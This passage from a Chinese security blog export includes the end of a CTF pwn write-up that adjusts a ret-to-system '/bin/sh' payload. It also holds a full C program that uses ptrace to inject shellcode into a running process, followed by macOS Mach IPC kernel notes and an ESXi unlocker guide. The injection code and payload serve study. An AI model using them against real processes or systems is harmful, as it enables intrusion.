<h6 id="2-之前有问题的exp"><a href="#2-之前有问题的exp" class="headerlink" title="2. 之前有问题的exp"></a>2. 之前有问题的exp</h6><p>因用的是之前百度杯的pwnme。<a href="http://o0xmuhe.me/2016/11/07/Baiudu%E6%9D%AF-pwn%E4%B8%93%E5%9C%BA%E8%AE%B0%E5%BD%95/">地址在这里</a></p>
<ul>
<li><p>   ret到system()的时候gdb里调试<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/system-any/exp-gdb-1.png" alt="gdb"></p>
</li>
<li><p>   si单步分析<br>和之前的test执行<code>execve()</code>的时候，参数对比，发现第第二个参数(rsi)有问题。<br>首先是这个有问题的exp<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/system-any/null-arg.png" alt="gdb"><br>然后是我自己的demo<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/system-any/demo-arg.png" alt="gdb"></p>
</li>
</ul>
<p>可以看到因为之前的某个操作，把/bin/sh给清了，这就导致执行了 sh -c null,也就是起了新进程，但是没shell~</p>
<h4 id="0x03-解决"><a href="#0x03-解决" class="headerlink" title="0x03 : 解决"></a>0x03 : 解决</h4><p>调整payload,把<code>/bin/sh</code>放在ret之后，调整下offset就好了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"\x90\x90\x90\x90/bin/sh"</span></span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/system-any/getshell.png"></p>
<h4 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 : 参考"></a>0x04 : 参考</h4><ul>
<li>   <a href="http://blog.chinaunix.net/uid-29191363-id-4020441.html">system分析</a></li>
<li>   joker ‘s help</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>Linux</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>linux code inject</title>
    <url>/2018/06/16/linux-code-inject/</url>
    <content><![CDATA[<h4 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 : 基础"></a>0x00 : 基础</h4><p>产生一个新的进程的方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sys_clone – creates a copy of the running process with or without shared resources (memory, file descriptors, etc.);</span><br><span class="line">sys_execve – replaces the running process with a new one (has several variations in the C library);</span><br><span class="line">fork - creates a copy of the running process but without any shared resources (Actually, both sys_fork and sys_clone come down to do_fork() function in the kernel).</span><br></pre></td></tr></table></figure>

<a id="more"></a>


<h4 id="0x01-实例"><a href="#0x01-实例" class="headerlink" title="0x01 : 实例"></a>0x01 : 实例</h4><p>目标程序代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;counter:%d\n&quot;</span>,i);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注入程序代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,<span class="keyword">char</span>* str,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * laddr;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span>&#123;</span></span><br><span class="line">        <span class="keyword">long</span> val;</span><br><span class="line">        <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len/long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA,child,addr+i*<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr,data.chars,long_size);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr+=long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j!=<span class="number">0</span>)&#123;</span><br><span class="line">        data.val=ptrace(PTRACE_PEEKDATA,child,addr+i*<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr,data.chars,j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,<span class="keyword">char</span>* str, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span>&#123;</span></span><br><span class="line">        <span class="keyword">long</span> val;</span><br><span class="line">        <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len/long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars,laddr,long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA,child,addr+i*<span class="number">4</span>,data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr+=long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars,laddr,j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA,child,addr+i*<span class="number">4</span>,data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> traced_process;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>,<span class="title">newregs</span>;</span></span><br><span class="line">    <span class="keyword">long</span> ins;</span><br><span class="line">    <span class="keyword">int</span> k,h;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">41</span>;</span><br><span class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\xeb\x15\x5e\xb8\x04\x00\x00\x00&quot;</span></span><br><span class="line">                        <span class="string">&quot;\xbb\x02\x00\x00\x00\x89\xf1\xba&quot;</span></span><br><span class="line">                        <span class="string">&quot;\x0c\x00\x00\x00\xcd\x80\xcc\xe8&quot;</span></span><br><span class="line">                        <span class="string">&quot;\xe6\xff\xff\xff\x48\x65\x6c\x6c&quot;</span></span><br><span class="line">                        <span class="string">&quot;\x6f\x20\x57\x6f\x72\x6c\x64\x0a\x00&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> backup[len];</span><br><span class="line">    <span class="keyword">long</span> addr;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;command input error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//attach to process </span></span><br><span class="line">    ptrace(PTRACE_ATTACH,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//get curren regs</span></span><br><span class="line">    ptrace(PTRACE_GETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="comment">//print eip</span></span><br><span class="line">    ins = ptrace(PTRACE_PEEKTEXT,traced_process,regs.eip,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;EIP:%lx instruction executed: %lx\n&quot;</span>,regs.eip,ins);</span><br><span class="line">    getdata(traced_process,regs.eip,backup,len);</span><br><span class="line">    <span class="comment">//print code</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;backup is :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">0</span>;k&lt;<span class="number">41</span>;k++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>,backup[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    putdata(traced_process,regs.eip,shellcode,len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode is :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">0</span>;k&lt;<span class="number">41</span>;k++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>,shellcode[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="comment">//re-set args</span></span><br><span class="line">    ptrace(PTRACE_SETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="comment">//back</span></span><br><span class="line">    ptrace(PTRACE_CONT,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//wait for change</span></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Press the enter key to continue\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">//recover the code</span></span><br><span class="line">    putdata(traced_process,regs.eip,backup,len);</span><br><span class="line">    ptrace(PTRACE_SETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;excute origion code\n&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_DETACH,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-效果"><a href="#0x02-效果" class="headerlink" title="0x02 : 效果"></a>0x02 : 效果</h4><p><img src="http://blogimg-10065924.cossh.myqcloud.com/linux_code_inject/1.jpg" alt="res"></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>macOS IPC Study Notes</title>
    <url>/2019/09/20/macOS-IPC-Study-basic-2/</url>
    <content><![CDATA[<h2 id="1-方式"><a href="#1-方式" class="headerlink" title="1. 方式"></a>1. 方式</h2><a id="more"></a>

<ul>
<li><p>MIG</p>
</li>
<li><p>XPC</p>
</li>
<li><p>DO</p>
<p>….</p>
</li>
</ul>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651523516510.jpg" alt="-w303"></p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651523730105.jpg" alt="-w843"></p>
<p>然而一切都是在Mach Msg的基础之上的。</p>
<h2 id="2-一些基础概念"><a href="#2-一些基础概念" class="headerlink" title="2. 一些基础概念"></a>2. 一些基础概念</h2><h3 id="2-1-什么是Port"><a href="#2-1-什么是Port" class="headerlink" title="2.1 什么是Port"></a>2.1 什么是Port</h3><p>个人理解就是类似Windows上handle的概念。<br>用户态经过处理是一个类似socket的整数，内核态(namep)索引到与之对应的消息队列，IPC时通过Port传递数据到消息队列，或者从消息队列取出数据。</p>
<h4 id="2-2-2-port-name"><a href="#2-2-2-port-name" class="headerlink" title="2.2.2 port name"></a>2.2.2 port name</h4><h4 id="2-2-3-port-right"><a href="#2-2-3-port-right" class="headerlink" title="2.2.3 (port) right"></a>2.2.3 (port) right</h4><p>一个port和对这个port的访问权限，有对应的权限才能做对应的操作，比如recv，接收数据；send，发送数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define MACH_PORT_RIGHT_SEND		((mach_port_right_t) 0)</span><br><span class="line">#define MACH_PORT_RIGHT_RECEIVE		((mach_port_right_t) 1)</span><br><span class="line">#define MACH_PORT_RIGHT_SEND_ONCE	((mach_port_right_t) 2)</span><br><span class="line">#define MACH_PORT_RIGHT_PORT_SET	((mach_port_right_t) 3)</span><br><span class="line">#define MACH_PORT_RIGHT_DEAD_NAME	((mach_port_right_t) 4)</span><br><span class="line">#define MACH_PORT_RIGHT_LABELH	        ((mach_port_right_t) 5)</span><br><span class="line">#define MACH_PORT_RIGHT_NUMBER		((mach_port_right_t) 6)</span><br></pre></td></tr></table></figure>



<h3 id="2-2-创建流程"><a href="#2-2-创建流程" class="headerlink" title="2.2 创建流程"></a><a href="http://localhost:23333/source/xref/osfmk/ipc/mach_port.c">2.2 创建流程</a></h3><p>示例代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mach_port_t</span> p;</span><br><span class="line">mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;p);</span><br></pre></td></tr></table></figure>

<p><code>mach_port_allocate</code></p>
<p>函数定义如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_port_allocate(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_right_t</span>	right,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	*namep)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">kern_return_t</span>		kr;</span><br><span class="line">	<span class="keyword">mach_port_qos_t</span>		qos = qos_template;</span><br><span class="line"></span><br><span class="line">	kr = mach_port_allocate_full (space, right, MACH_PORT_NULL,</span><br><span class="line">					&amp;qos, namep);</span><br><span class="line">	<span class="keyword">return</span> (kr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mach_port_allocate_full</code><br>根据不同的right走不同的分配逻辑：<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651518463591.jpg" alt="-w680"></p>
<p><code>ipc_port_alloc</code> /<code>ipc_port_alloc_name</code><br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651517357620.jpg" alt="-w614"></p>
<p>两个函数区别只是是否指定了name。</p>
<p><code>ipc_object_alloc</code><br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651517526507.jpg" alt="-w596"></p>
<p>348行通过一个宏，把port转name的方式获取namep，之后对ipc entry的关键结构进行初始化。</p>
<p><code>ipc_port_init</code></p>
<p>初始化<a href="http://localhost:23333/source/xref/osfmk/ipc/ipc_port.h#112">port结构</a></p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651518062479.jpg" alt="-w641"></p>
<p>至此，port初始化完成，namep初始化完成，可以根据namep索引到对应的内核中的消息队列。</p>
<p>port与ipc entry的关系，来自Mac OS X Internals:</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651519972092.jpg"></p>
<p><strong>其中的一些概念：</strong></p>
<ul>
<li>用户态 mach_port_t</li>
</ul>
<p>port在用户态表示，类似socket的一个整数</p>
<ul>
<li><p>内核态 mach_port_name_t</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef natural_t mach_port_name_t;</span><br></pre></td></tr></table></figure>
<p>port在内核态表示</p>
</li>
<li><p>qos</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Structure used to pass information about port allocation requests.Must be padded to 64-bits total length.</span><br></pre></td></tr></table></figure></li>
<li><p>ipc space </p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Each task has a private IPC spacea namespace for portsthat is represented by the ipc_space structure in the kernel. </span><br><span class="line">Mac OS X Internals</span><br></pre></td></tr></table></figure>
<p>每个task都有自己的唯一一个ipc sapce,</p>
<p>其中 <code>    ipc_entry_t is_table;        /* an array of entries */</code> 字段是放着所有的ipc entry。</p>
<p><a href="http://localhost:23333/source/xref/osfmk/kern/task.h">task的结构体实在是太大了</a>，从task的<code>struct ipc_space *itk_space;</code>字段索引到其对应的ipc space。</p>
<ul>
<li>ipc entry</li>
</ul>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651508934037.jpg"></p>
<p>看源码发现，图中的<code>ipc_tree_entry</code>结构没了:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> &#123;</span></span><br><span class="line">	<span class="keyword">lck_spin_t</span>	is_lock_data;</span><br><span class="line">	<span class="keyword">ipc_space_refs_t</span> is_bits;	<span class="comment">/* holds refs, active, growing */</span></span><br><span class="line">	<span class="keyword">ipc_entry_num_t</span> is_table_size;	<span class="comment">/* current size of table */</span></span><br><span class="line">	<span class="keyword">ipc_entry_num_t</span> is_table_free;	<span class="comment">/* count of free elements */</span></span><br><span class="line">	<span class="keyword">ipc_entry_t</span> is_table;		<span class="comment">/* an array of entries */</span></span><br><span class="line">	<span class="keyword">task_t</span> is_task;                 <span class="comment">/* associated task */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_table_size</span> *<span class="title">is_table_next</span>;</span> <span class="comment">/* info for larger table */</span></span><br><span class="line">	<span class="keyword">ipc_entry_num_t</span> is_low_mod;	<span class="comment">/* lowest modified entry during growth */</span></span><br><span class="line">	<span class="keyword">ipc_entry_num_t</span> is_high_mod;	<span class="comment">/* highest modified entry during growth */</span></span><br><span class="line">	<span class="keyword">int</span> is_node_id;			<span class="comment">/* HOST_LOCAL_NODE, or remote node if proxy space */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li> port的user reference计数是啥<br>一个port的user reference只表示了某个entry在task的space中被多少个地方使用，和entry实际指向哪个port没有关系</li>
</ul>
<h3 id="2-3-发送MACH-MSG"><a href="#2-3-发送MACH-MSG" class="headerlink" title="2.3 发送MACH MSG"></a>2.3 发送MACH MSG</h3><p>mach msg的结构不再赘述，这部分直接看<code>message.h</code>头文件里的定义即可，下面着重看发送和接收过程。</p>
<p><strong>其实是一个把mach msg转换成kmsg结构，然后入队(目标消息队列)的操作，目标进程获取就是一个出队的操作。</strong></p>
<p><code>用户态(client) &lt;--&gt; 内核态 &lt;--&gt; 用户态(server)</code></p>
<p>收/发都是用<code>mach_msg</code>，使用options参数区别是收还是发。</p>
<h4 id="2-3-1-流程"><a href="#2-3-1-流程" class="headerlink" title="2.3.1 流程"></a>2.3.1 流程</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mach_msg(...)</span><br><span class="line">    mach_msg_trap(...)</span><br><span class="line">        mach_msg_overwrite_trap(...)</span><br><span class="line">            option &amp; MACH_SEND_MSG --&gt; mach_msg_send</span><br><span class="line">                <span class="comment">// mach_msg --&gt; kmsg</span></span><br><span class="line">                <span class="comment">// alloc a kernel msg buffer(kmsg), and copy user mach_msg to kernel msg buffer</span></span><br><span class="line">                ipc_kmsg_get(msg_addr, send_size, &amp;kmsg);</span><br><span class="line">                ipc_kmsg_copyin</span><br><span class="line">                    ipc_kmsg_copyin_hearder(kmsg, space, <span class="keyword">override</span>, optionp)</span><br><span class="line">                    ipc_kmsg_copyin_body(kmsg, space, <span class="built_in">map</span>, optionp)</span><br><span class="line">                ipc_kmsg_send</span><br><span class="line">                    ipc_voucher_send_preprocessing(kmsg);</span><br><span class="line">                    ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg,option,send_timeout);</span><br><span class="line">            option &amp; MACH_RCV_MSG <span class="comment">//TODO</span></span><br><span class="line">                ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object);</span><br><span class="line">                mach_msg_rcv_link_special_reply_port(...)</span><br><span class="line">                ipc_mqueue_receive</span><br><span class="line">                mach_msg_receive_results</span><br></pre></td></tr></table></figure>

<h4 id="2-3-2-发送"><a href="#2-3-2-发送" class="headerlink" title="2.3.2 发送"></a>2.3.2 发送</h4><ul>
<li><p>mach_msg_send( mach_msg_header_t    *msg, mach_msg_option_t    option, mach_msg_size_t        send_size, mach_msg_timeout_t    send_timeout, mach_msg_priority_t    override)</p>
<p>  根据消息大小重新分配了内存，并且把消息拷贝进来，并且消息尾部增加了一些字段:</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">trailer = (<span class="keyword">mach_msg_max_trailer_t</span> *) ((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header + send_size);</span><br><span class="line">trailer-&gt;msgh_sender = current_thread()-&gt;task-&gt;sec_token;</span><br><span class="line">trailer-&gt;msgh_audit = current_thread()-&gt;task-&gt;audit_token;</span><br><span class="line">trailer-&gt;msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0;</span><br><span class="line">trailer-&gt;msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE;</span><br></pre></td></tr></table></figure>
<p>   之前审服务的时候遇到过，还以为这部分是可控的，造成乌龙。 囧</p>
<ul>
<li><p>ipc_kmsg_copyin(kmsg, space, map, override, &amp;option);</p>
<p>  此时<code>kmsg</code>是新分配的内存，里面放的是要发送的mach msg， space和map都是当前task的space和map，直接获取，这部分有个图，可以看<code>Macos Internals</code>。</p>
<ul>
<li>ipc_kmsg_copyin_header(kmsg, space, override, optionp);<br>   拷贝 <code>port rights</code>，成功的话，原本消息中(kmsg)的port name都会被替换成对应的对象的指针。</li>
<li>ipc_kmsg_copyin_body( kmsg, space, map);<br>  <strong>拷贝msg body部分，中间验证了size、desc部分的size，类型等字段。</strong><br>  desc_count &lt; 0x3fff 。<br>  descriptor_size部分，必须是desc*16 == descriptor_size，不满足会为了对齐而调整。<br>   最终完成拷贝，把用户态的<code>mach msg</code>拷贝到了kmsg中。</li>
</ul>
</li>
<li><p>ipc_kmsg_send(kmsg, option, send_timeout);<br>  到这里的时候port right拷贝了，消息内容也拷贝了，该直接发送了。<strong>把消息发送到dst的消息队列里。</strong><br>  对于发送给内核的消息和非内核的消息分开处理<br>  内核：<code>kmsg = ipc_kobject_server(kmsg, option);</code><br>  其他：<code>ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg, option, send_timeout);</code></p>
</li>
</ul>
<h4 id="2-3-3-接收"><a href="#2-3-3-接收" class="headerlink" title="2.3.3 接收"></a>2.3.3 接收</h4><ul>
<li><p><code>ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object);</code><br>  Convert a name in a space to a message queue.<br>  根据这个recv_name在space里找到<code>ipc_entry</code>结构，从而找到其中<code>ipc_object-&gt;ipmessage</code>结构。<br>  <img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15688799669922.jpg" alt="-w532"></p>
</li>
<li><p>mach_msg_rcv_link_special_reply_port(…)</p>
</li>
<li><p><code>ipc_mqueue_receive(mqueue, option, rcv_size, msg_timeout, THREAD_ABORTSAFE);</code><br>  Receive a message from a message queue<br>  之前得到了消息队列<code>mqueue</code>，这个函数就是从这个消息队列中取出消息。</p>
<ul>
<li><p>ipc_mqueue_receive_on_thread<br>使用指定thread从消息队列中接收消息。<br>接受分port set(<code>imq_is_set()</code>) 和 单个port(<code>imq_is_queue()</code>)，这部分看message queue的结构体也能看出来必须要这么处理。</p>
<p>消息队列是一个循环双向链表，取消息的过程就是一个 unlink的过程：<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15688831598476.jpg" alt="-w629"></p>
</li>
</ul>
</li>
</ul>
<ul>
<li>mach_msg_receive_results<br>  Receive a message， copy out的操作，把之前“解链”的消息拷贝出来。</li>
</ul>
<h2 id="3-引用"><a href="#3-引用" class="headerlink" title="3. 引用"></a>3. 引用</h2><p><a href="https://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/">再谈Mach-IPC</a><br>Mac OS X Internals<br>MOXil<br>Auditing and Exploiting Apple IPC – Ianbeer<br><a href="https://bazad.github.io/">bazad</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>MacOS</tag>
        <tag>IPC</tag>
        <tag>Mach</tag>
      </tags>
  </entry>
  <entry>
    <title>macOS on ESXi</title>
    <url>/2019/05/10/macOS-on-ESXi/</url>
    <content><![CDATA[<h1 id="VMWare-ESXI-配置macOS虚拟机"><a href="#VMWare-ESXI-配置macOS虚拟机" class="headerlink" title="VMWare ESXI 配置macOS虚拟机"></a>VMWare ESXI 配置macOS虚拟机</h1><a id="more"></a>



<h2 id="需要的工具-ISO"><a href="#需要的工具-ISO" class="headerlink" title="需要的工具/ISO"></a>需要的工具/ISO</h2><p><a href="https://github.com/DrDonk/esxi-unlocker">unlocker3.0</a></p>
<p>或者 <a href="https://github.com/o0xmuhe/macOS_on_ESXi">unlocker</a></p>
<p>macOS的ISO自行下载</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="给esxi打补丁"><a href="#给esxi打补丁" class="headerlink" title="给esxi打补丁"></a>给esxi打补丁</h3><h4 id="1-unlocker3-0"><a href="#1-unlocker3-0" class="headerlink" title="1. unlocker3.0"></a>1. unlocker3.0</h4><ul>
<li><p>登陆网页端esxi管理，打开服务器的ssh服务。</p>
</li>
<li><p>在macOS的系统上构建好unlocker</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python esxi-build.py</span><br></pre></td></tr></table></figure>
<ul>
<li>ssh登陆进去，把上个步骤得到的所有东西上传到服务器。</li>
<li>打补丁</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf esxi-unlocker-300.tgz</span><br><span class="line">chmod a+x *.sh</span><br><span class="line">./esxi-install.sh</span><br><span class="line"><span class="comment"># then reboot your server</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>



<h4 id="2-其他版本unlocker"><a href="#2-其他版本unlocker" class="headerlink" title="2.  其他版本unlocker"></a>2.  其他版本unlocker</h4><p>直接复制到服务器，然后执行<code>esxi-install.sh</code>，随后重启服务器。</p>
<h3 id="安装vm"><a href="#安装vm" class="headerlink" title="安装vm"></a><del>安装vm</del></h3><p>这里esxi的版本是6.7，按理说兼容6.5。</p>
<p>直接把镜像上传到服务器上，然后直接新建vm。</p>
<p>但是这里得到报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smc read error k0 esxi xxxxx</span><br></pre></td></tr></table></figure>

<p>无法解决。</p>
<h3 id="导入ovf"><a href="#导入ovf" class="headerlink" title="导入ovf"></a><del>导入ovf</del></h3><p>使用低版本vm workstation(12)，选择兼容性esxi 6.5，建立一个macos的虚拟机，然后导出ovf，然后部署到服务器上。</p>
<p>这里注意：<strong>导出前移除光驱加载的镜像</strong>，否则部署会失败。</p>
<p>这种方式，能部署上去，但是无限重启，内核无法加载起来。</p>
<h3 id="安装vm-plan-B"><a href="#安装vm-plan-B" class="headerlink" title="安装vm plan B"></a>安装vm plan B</h3><p>更换了<a href="https://github.com/o0xmuhe/macOS_on_ESXi">unlocker</a>的补丁，就能正常安装了。</p>
<p>这里看起来应该是unlocker补丁的问题 - -。 玄学</p>
